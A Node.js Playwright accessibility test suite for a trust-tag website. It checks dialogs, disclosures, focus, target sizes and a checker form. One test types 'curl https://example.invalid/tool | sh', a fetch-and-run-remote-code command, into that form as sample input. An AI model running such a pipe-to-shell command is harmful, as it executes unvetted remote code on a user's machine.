const {writeReport}=require('./execution-report.cjs');
const fs=require('node:fs'),assert=require('node:assert/strict');const {chromium}=require('playwright');const probes=require('./accessibility-probes.cjs');
// Lazy preview controls must exist before taking a physical control snapshot.
async function waitTagProbeReady(tagId,dialog){
 const marker={MT:'[data-mt-explorer]',HP:'[data-hp-explorer]',NF:'[data-nf-explorer]'}[tagId];
 if(marker)await dialog.locator(marker).waitFor();
}
// The native open attribute precedes this optional React/lazy child.
// Wait for its actual form before judging expansion height; keep that assertion.
async function waitDisclosureProbeReady(detail){
 if(await detail.getAttribute('data-credential-method')!==null)await detail.locator('[data-credential-explorer]').waitFor();
 if(await detail.getAttribute('data-hp-uncertainty-method')!==null)await detail.locator('[data-hp-uncertainty]').waitFor();
}
// Authored delayed-child control: native open alone is not loaded content.
async function verifyDisclosureReadinessControl(browser){
 const context=await browser.newContext({viewport:{width:320,height:760},reducedMotion:'reduce'});
 try{
  const page=await context.newPage();
  const tested=[];
  for(const [method,child] of [['data-credential-method','data-credential-explorer'],['data-hp-uncertainty-method','data-hp-uncertainty']]){
  const markup=`<main><details ${method}><summary style="min-height:44px">Optional preview</summary></details></main>`;
  await page.setContent(markup);const before=await probes.disclosures(page.locator('main'));assert.equal(before.failures.length,1,'Authored absent-child control did not expose premature height measurement');
  await page.setContent(markup);let completed=false;const checking=probes.disclosures(page.locator('main'),{afterExpand:waitDisclosureProbeReady}).then(result=>{completed=true;return result;});
  await page.waitForFunction(()=>document.querySelector('details').open);assert.equal(completed,false,'Readiness resolved before the deferred child');
  await page.evaluate(attribute=>{const child=document.createElement('form');child.setAttribute(attribute,'');child.textContent='Loaded preview content';child.style.minHeight='80px';document.querySelector('details').append(child);},child);
  const after=await checking;assert.deepEqual(after.failures,[],'Loaded deferred disclosure failed unchanged expansion assertion');
  await page.setContent(markup+'<style>details[open]{height:44px;overflow:hidden}</style>');
  await page.evaluate(attribute=>{const child=document.createElement('form');child.setAttribute(attribute,'');child.style.minHeight='80px';document.querySelector('details').append(child);},child);
  const broken=await probes.disclosures(page.locator('main'),{afterExpand:waitDisclosureProbeReady});assert.equal(broken.failures.length,1,'Readiness hid a genuinely non-expanding disclosure');
  tested.push(method);
  }
  return {pass:true,tested_markers:tested,authored_absent_child_reproduced:true,waited_for_actual_child:true,unchanged_height_assertion_passed:true,dead_expansion_still_refused:true,product_source_changed:false};
 }finally{await context.close();}
}
// Wait for the real native toggle task, then the declared deferred public body.
// No arbitrary delay, scope-error substitution or control skipping is allowed.
async function expandForMeasurement(root){
 for(const detail of await root.locator('details').all())await detail.evaluate(async e=>{
  if(e.open)return;
  await new Promise(resolve=>{e.addEventListener('toggle',resolve,{once:true});e.open=true;});
 });
 const privacy=root.locator('details').filter({hasText:'Privacy and full details'});
 if(await privacy.count())await privacy.getByRole('button',{name:'Download details',exact:true}).waitFor();
 const credential=root.locator('[data-credential-method]');
 if(await credential.count())await credential.locator('[data-credential-explorer]').waitFor();
 const uncertainty=root.locator('[data-hp-uncertainty-method][open]');
 if(await uncertainty.count())await uncertainty.locator('[data-hp-uncertainty]').waitFor();
}
// Actual deferred public data: ready-first coverage and physical-node identity.
// Native close is an authored lifecycle control, not a claim about the original
// timeout ordering (which remains unestablished).
async function waitPhysicalDetach(page,node){
 await page.waitForFunction(el=>!el.isConnected,node);
}
async function verifyPhysicalDetachControl(browser){
 const context=await browser.newContext();
 try{
  const page=await context.newPage();await page.setContent('<details open><summary>Details</summary><button>Download details</button></details>');
  const button=page.getByRole('button',{name:'Download details',exact:true}),physical=await button.elementHandle();
  try{
   await page.locator('summary').press('Enter');await button.waitFor({state:'detached'});
   assert.equal(await physical.evaluate(e=>e.isConnected),true,'Authored role-hidden control unexpectedly detached');
   let completed=false;const waiting=waitPhysicalDetach(page,physical).then(()=>{completed=true;});
   await page.evaluate(()=>document.querySelector('details').open);assert.equal(completed,false,'Physical readiness resolved while node remained attached');
   await physical.evaluate(e=>e.remove());await waiting;
   return {pass:true,role_detached_can_mean_hidden_connected:true,waited_for_physical_disconnection:true};
  }finally{await physical?.dispose();}
 }finally{await context.close();}
}
async function verifyDeferredReadinessControl(browser,base){
 const physicalDetachControl=await verifyPhysicalDetachControl(browser);
 const context=await browser.newContext({viewport:{width:320,height:760},bypassCSP:true,reducedMotion:'reduce'});
 let release,requested;const gate=new Promise(resolve=>release=resolve),requestSeen=new Promise(resolve=>requested=resolve);let requests=0,capture;
 try{
  await context.route(/\/assets\/public-scope-[^/]+\.json$/,async route=>{requests++;requested();await gate;await route.continue();});
  const page=await context.newPage();await page.goto(base+'/#person/PII_REDACTED',{waitUntil:'domcontentloaded'});
  const dialog=page.getByRole('dialog');await dialog.waitFor();assert.equal(requests,0,'Scope loaded before first disclosure open');
  const disclosure=await probes.disclosures(dialog,{afterExpand:waitDisclosureProbeReady});assert.deepEqual(disclosure.failures,[]);
  let ready=false;const waiting=expandForMeasurement(dialog).then(()=>{ready=true;});await requestSeen;
  assert.equal(ready,false,'Public-body readiness resolved before actual data');
  assert.equal(await dialog.getByRole('button',{name:'Download details',exact:true}).count(),0);
  release();await waiting;assert.equal(requests,1);
  capture=await probes.controls(dialog,{surface:'PII deferred readiness',theme:'light'});
  const names=await Promise.all(capture.items.map(el=>el.evaluate(e=>(e.getAttribute('aria-label')||e.textContent).trim())));
  assert(names.includes('Copy link'));assert(names.includes('Download details'));
  const report=capture.items[names.indexOf('Report an issue')];assert(report,'Report target missing');
  const privacy=dialog.locator('details').filter({hasText:'Privacy and full details'});
  const download=capture.items[names.indexOf('Download details')];assert(download,'Download target missing');
  await privacy.locator('summary').press('Enter');await waitPhysicalDetach(page,download);
  assert.equal(await report.evaluate(e=>e.textContent.trim()),'Report an issue','Physical target was retargeted after native close');
  await assert.rejects(capture.verify(),/Accessibility control set changed during probe/);
  await capture.dispose();capture=undefined;await expandForMeasurement(dialog);
  const targets=await probes.targetSizes(dialog,{surface:'PII deferred ready',theme:'light'}),focus=await probes.focusVisibility(page,dialog,{surface:'PII deferred ready',theme:'light'});
  assert.deepEqual(targets.failures,[]);assert.deepEqual(focus.failures,[]);
  return {pass:true,physicalDetachControl,download_physically_detached:true,no_scope_request_before_open:true,actual_scope_request_held:true,readiness_waited_for_public_data:true,ready_control_count:names.length,copy_and_download_measured:true,physical_report_identity_preserved:true,changed_set_rejected:true,requests,targets,focus,original_timeout_cause:'UNESTABLISHED',product_source_changed:false};
 }finally{release();await capture?.dispose();await context.close();}
}
async function verifyHPReadinessControl(browser,base){
 const results=[];const selector='a[href],button,input:not([type="hidden"]),textarea,select,summary,[role="button"],[role="tab"],[role="switch"]';
 for(const theme of ['light','dark']){
  const context=await browser.newContext({viewport:{width:320,height:760},bypassCSP:true,reducedMotion:'reduce'});
  let release;const gate=new Promise(resolve=>release=resolve);let intercepted=false;
  try{
   await context.route(/\/assets\/HPExplorer-[^/]+\.js$/,async route=>{intercepted=true;await gate;await route.continue();});
   const page=await context.newPage();await page.goto(base+'/#person/HP',{waitUntil:'domcontentloaded'});await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);
   const dialog=page.getByRole('dialog');await dialog.waitFor();
   assert.equal(await dialog.locator('[data-hp-explorer]').count(),0,'Delayed control failed to hold the actual HP child');
   let ready=false;const waiting=waitTagProbeReady('HP',dialog).then(()=>{ready=true;});
   // Keep exactly the live nth-locator shape returned by the unchanged probes.
   // The real HP form later inserts five controls before the existing disclosures.
   const indexed=await dialog.locator(selector).all();const held=indexed[4];
   const beforeName=await held.innerText();await page.keyboard.press('Tab');await held.scrollIntoViewIfNeeded();await held.focus();
   assert(await held.evaluate(el=>el===document.activeElement),'Authored pre-mount target could not receive focus');
   assert.equal(ready,false,'Readiness resolved while the child was still withheld');
   release();await waiting;assert(intercepted,'Delayed control missed the real child chunk');
   const after=await held.evaluate(el=>{const css=getComputedStyle(el);return {name:el.textContent.trim(),focused:el===document.activeElement,indicator:parseFloat(css.outlineWidth)>0&&css.outlineStyle!=='none'||css.boxShadow!=='none'};});
   assert.equal(after.name,'Source notices','Controlled insertion no longer reproduces the indexed-locator boundary');
   assert.notEqual(beforeName,after.name);assert.equal(after.focused,false);assert.equal(after.indicator,false);
   await page.evaluate(()=>document.fonts.ready);const disclosure=await probes.disclosures(dialog,{afterExpand:waitDisclosureProbeReady});
   await expandForMeasurement(dialog);
   const targets=await probes.targetSizes(dialog,{surface:'HP controlled readiness',theme}),focus=await probes.focusVisibility(page,dialog,{surface:'HP controlled readiness',theme}),spacing=await probes.spacing(page,dialog);
   assert.deepEqual(disclosure.failures,[],'Ready HP disclosures');assert.deepEqual(targets.failures,[],'Ready HP targets');assert.deepEqual(focus.failures,[],'Ready HP focus');assert.deepEqual(spacing.clipped,[],'Ready HP clipping');assert.equal(spacing.horizontal_overflow,false,'Ready HP overflow');
   await page.emulateMedia({forcedColors:'active'});assert(await dialog.isVisible());assert.equal(await dialog.evaluate(el=>el.scrollWidth>el.clientWidth+1),false,'Ready HP forced-colors overflow');
   results.push({theme,actual_child_request_held:true,readiness_waited_for_child:true,indexed_target_before:beforeName,indexed_target_after:after,ready_first:{disclosure,targets,focus,spacing},forced_colors_reflow:true});
  }finally{release();await context.close();}
 }
 return {pass:true,controlled_actual_hp_lazy_insertion:true,unchanged_probes:true,themes:results,manual_screen_reader:false};
}
// Failure-only: do not add DOM reads or waits to successful probe timing.
async function measurementFailureContext(page,stage,allowedRoutes){
 const tagId=allowedRoutes.some(route=>route==='#person/'+stage.tagId||route==='#enterprise/'+stage.tagId)?stage.tagId:null;
 const footerSlug=allowedRoutes.includes('#'+stage.footerSlug)?stage.footerSlug:null;
 const surface=[tagId,footerSlug,'catalogue','PS checker empty','PS checker result'].includes(stage.surface)?stage.surface:null;
 const actions=['start','failure_context_control','authored_disclosure_readiness','deferred_public_readiness','hp_lazy_readiness','create_context','goto','set_theme','dialog_ready','lazy_tag_ready','fonts','disclosures','expand_for_measurement','targets','focus','spacing','assert_targets','assert_focus','assert_spacing','assert_overflow','assert_disclosures','forced_colors_on','forced_colors_visible','forced_colors_overflow','forced_colors_off','open_ps_checker','ps_invalid_input_validation','ps_valid_input_submit','ps_result_ready','screenshot','context_close'];
 const safe={surface,theme:['light','dark'].includes(stage.theme)?stage.theme:null,action:actions.includes(stage.action)?stage.action:null,tagId,footerSlug};
 const result={...safe,observed:null};if(!page)return {...result,observation_unavailable:true};let timer;
 try{result.observed=await Promise.race([page.evaluate(({stage,allowedRoutes})=>{
  let trigger=null;if(stage.tagId)trigger=document.querySelector('[data-tag-id="'+stage.tagId+'"]');
  else if(stage.footerSlug)trigger=document.querySelector('nav[aria-label="Company and community"] a[href="#'+stage.footerSlug+'"]');
  const safeId=value=>typeof value==='string'&&/^radix-[a-z0-9_:-]{1,80}$/.test(value)?value:null;
  const expected=safeId(trigger?.getAttribute('aria-controls')),all=[...document.querySelectorAll('[role="dialog"]')];
  return {route:allowedRoutes.includes(location.hash)?location.hash:'UNRECOGNIZED',expected_dialog_id:expected,dialog_count:all.length,dialogs:all.slice(0,8).map(e=>({id:safeId(e.id),expected:expected!==null&&e.id===expected,connected:e.isConnected,visible:Boolean(e.getClientRects().length)&&getComputedStyle(e).visibility!=='hidden'&&getComputedStyle(e).display!=='none',state:['open','closed'].includes(e.getAttribute('data-state'))?e.getAttribute('data-state'):null}))};
 },{stage:safe,allowedRoutes}),new Promise((_,reject)=>{timer=setTimeout(()=>reject(Error('Failure observation deadline')),1000);})]);}
 catch{result.observation_unavailable=true;}finally{clearTimeout(timer);}return result;
}
// Authored failure only: private DOM text/values/hash must not enter diagnostics.
async function verifyFailureContextControl(browser){
 const context=await browser.newContext();let page;
 try{
  page=await context.newPage();await page.setContent('<button data-tag-id="IV" aria-controls="radix-_r_expected_">PRIVATE_LABEL_CANARY</button><section role="dialog" id="radix-_r_other_" aria-label="PRIVATE_DIALOG_CANARY" data-state="open"><input value="PRIVATE_INPUT_CANARY"></section>');
  await page.evaluate(()=>{location.hash='#PRIVATE_ROUTE_CANARY';});
  let failed=false;try{await page.evaluate(()=>{throw Error('Authored measurement failure');});}catch{failed=true;}assert(failed);
  const stage={surface:'IV',theme:'dark',action:'forced_colors_overflow',tagId:'IV',footerSlug:null,extra:'PRIVATE_CONTEXT_CANARY'};
  const observed=await measurementFailureContext(page,stage,['#person/IV','#person/MT','#person']);
  assert.equal(observed.observed.route,'UNRECOGNIZED');assert.equal(observed.observed.expected_dialog_id,'radix-_r_expected_');assert.equal(observed.observed.dialogs[0].expected,false);assert(!JSON.stringify(observed).includes('PRIVATE_'));assert(!Object.hasOwn(observed,'extra'));
  await context.close();const closed=await measurementFailureContext(page,stage,['#person/IV']);assert.equal(closed.observation_unavailable,true);
  const missing=await measurementFailureContext(null,stage,['#person/IV']);assert.equal(missing.observation_unavailable,true);
  return {pass:true,original_failure_observed:true,expected_and_actual_identity_discriminated:true,unknown_route_not_echoed:true,no_labels_text_or_input_values:true,unknown_context_keys_not_echoed:true,closed_or_missing_page_bounded_unavailable:true,product_source_changed:false};
 }finally{await context.close();}
}
module.exports={waitTagProbeReady,waitDisclosureProbeReady,verifyHPReadinessControl,expandForMeasurement,verifyDeferredReadinessControl,verifyDisclosureReadinessControl,measurementFailureContext,verifyFailureContextControl,waitPhysicalDetach,verifyPhysicalDetachControl};
if(require.main===module)(async()=>{
 const {allTags}=await import('../site/src/catalog.js');
 // Workflow navigation is declared in a JSX file; use the existing user-facing routes.
 const footer=['report','assist','townhall','teamwork','scope','how-tags-work','about','legal'];
 const base=process.env.AITRUST_SITE_URL||'http://127.0.0.1:5174';const browser=await chromium.launch();const results=[],errors=[],validation=[];
 let activePage=null,stage={surface:null,theme:null,action:'start',tagId:null,footerSlug:null};const phase=action=>{stage={...stage,action};};
 const allowedRoutes=['','#person','#enterprise',...allTags.map(t=>'#'+t.audience+'/'+t.id),...footer.map(slug=>'#'+slug)];
 try{phase('failure_context_control');const failureContextControl=await verifyFailureContextControl(browser);phase('authored_disclosure_readiness');const disclosureReadiness=await verifyDisclosureReadinessControl(browser);phase('deferred_public_readiness');const deferredReadiness=await verifyDeferredReadinessControl(browser,base);phase('hp_lazy_readiness');const lazyReadiness=await verifyHPReadinessControl(browser,base);for(const theme of ['light','dark']){
  stage={surface:null,theme,action:'create_context',tagId:null,footerSlug:null};activePage=null;const context=await browser.newContext({viewport:{width:320,height:760},bypassCSP:true,reducedMotion:'reduce'});const page=await context.newPage();activePage=page;page.on('pageerror',e=>errors.push(e.message));
  async function check(name,root){
   stage={...stage,surface:name,theme};phase('fonts');await page.evaluate(()=>document.fonts.ready);phase('disclosures');const disclosure=await probes.disclosures(root,{afterExpand:waitDisclosureProbeReady});phase('expand_for_measurement');await expandForMeasurement(root);phase('targets');const targets=await probes.targetSizes(root,{surface:name,theme});phase('focus');const focus=await probes.focusVisibility(page,root,{surface:name,theme});phase('spacing');const spacing=await probes.spacing(page,root);
   const r={name,theme,targets,focus,spacing,disclosure};results.push(r);
   phase('assert_targets');assert.deepEqual(targets.failures,[],name+' targets');phase('assert_focus');assert.deepEqual(focus.failures,[],name+' focus');phase('assert_spacing');assert.deepEqual(spacing.clipped,[],name+' text clipped');phase('assert_overflow');assert.equal(spacing.horizontal_overflow,false,name+' overflow');phase('assert_disclosures');assert.deepEqual(disclosure.failures,[],name+' disclosures');
   phase('forced_colors_on');await page.emulateMedia({forcedColors:'active'});phase('forced_colors_visible');assert(await root.isVisible());phase('forced_colors_overflow');assert.equal(await root.evaluate(e=>e.scrollWidth>e.clientWidth+1),false,name+' forced colors overflow');phase('forced_colors_off');await page.emulateMedia({forcedColors:'none'});
  }
  stage={surface:'catalogue',theme,action:'goto',tagId:null,footerSlug:null};await page.goto(base);phase('set_theme');await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);await check('catalogue',page.locator('body'));
  for(const tag of allTags){stage={surface:tag.id,theme,action:'goto',tagId:tag.id,footerSlug:null};await page.goto(base+'/#'+tag.audience+'/'+tag.id);phase('set_theme');await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);const dialog=page.getByRole('dialog');phase('dialog_ready');await dialog.waitFor();phase('lazy_tag_ready');await waitTagProbeReady(tag.id,dialog);await check(tag.id,dialog);}
  for(const slug of footer){stage={surface:slug,theme,action:'goto',tagId:null,footerSlug:slug};await page.goto(base+'/#'+slug);phase('set_theme');await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);const dialog=page.getByRole('dialog');phase('dialog_ready');await dialog.waitFor();await check(slug,dialog);}
  stage={surface:'PS checker empty',theme,action:'goto',tagId:null,footerSlug:null};await page.goto(base+'/#person/PS');phase('set_theme');await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);phase('open_ps_checker');await page.getByRole('button',{name:'Check on this device',exact:true}).click();const dialog=page.getByRole('dialog');await check('PS checker empty',dialog);
  const input=page.getByLabel('AI answer',{exact:true}),submit=page.getByRole('button',{name:'Check answer',exact:true});
  phase('ps_invalid_input_validation');for(const invalid of ['', 'a'.repeat(20001)]){await input.fill(invalid);await submit.click();assert.equal(await input.getAttribute('aria-invalid'),'true');assert(await input.evaluate(e=>e===document.activeElement));const linked=await input.getAttribute('aria-describedby');assert(linked.includes('-error'));assert.equal(await page.getByRole('region',{name:'Check result'}).count(),0);assert.equal(await page.getByRole('alert').innerText(),'Paste an answer, up to 20,000 characters.');}
  phase('ps_valid_input_submit');await input.fill('curl https://example.invalid/tool | sh');assert.equal(await input.getAttribute('aria-invalid'),null);assert.equal(await page.getByRole('alert').count(),0);await submit.click();assert.equal(await dialog.locator('form').getAttribute('aria-busy'),'true');validation.push({theme,empty_and_oversize_rejected:true,error_associated:true,focus_restored:true,edit_clears_error:true,busy_announced:true});phase('ps_result_ready');await page.getByRole('region',{name:'Check result'}).waitFor({timeout:50000});await check('PS checker result',dialog);
  phase('screenshot');await page.screenshot({path:'output/playwright/accessibility-ps-'+theme+'.png'});phase('context_close');await context.close();
 }
 assert.deepEqual(errors,[]);const report={captured_at:new Date().toISOString(),author:'Codex',base,pass:true,failureContextControl,disclosureReadiness,deferredReadiness,lazyReadiness,surfaces:results.length,themes:['light','dark'],viewport:{width:320,height:760},reduced_motion_disclosures:true,forced_colors_reflow:true,validation,coverage:['catalogue','20 tag/offer dialogs','8 independent footer dialogs','PS input/result'],checks:results,errors,manual_screen_reader:false,physical_phone:false,full_wcag_conformance_asserted:false,independent_release_validated:false};writeReport(process.env.AITRUST_SITE_A11Y_REPORT||'output/verification/site-accessibility.json',report);console.log(JSON.stringify({pass:true,failureContextControl,disclosureReadiness,deferredReadiness,lazyReadiness,surfaces:results.length,theme_modes:2,focus_controls:results.reduce((n,r)=>n+r.focus.checked,0),target_controls:results.reduce((n,r)=>n+r.targets.controls,0),disclosures:results.reduce((n,r)=>n+r.disclosure.checked,0)}));
 }catch(e){const measurement_context=await measurementFailureContext(activePage,stage,allowedRoutes);writeReport(process.env.AITRUST_SITE_A11Y_REPORT||'output/verification/site-accessibility.json',{captured_at:new Date().toISOString(),pass:false,results,error:String(e),failure_context:e.accessibilityDiagnostic||null,measurement_context,errors,full_wcag_conformance_asserted:false});throw e;}finally{await browser.close();}
})().catch(e=>{console.error(e);process.exitCode=1});
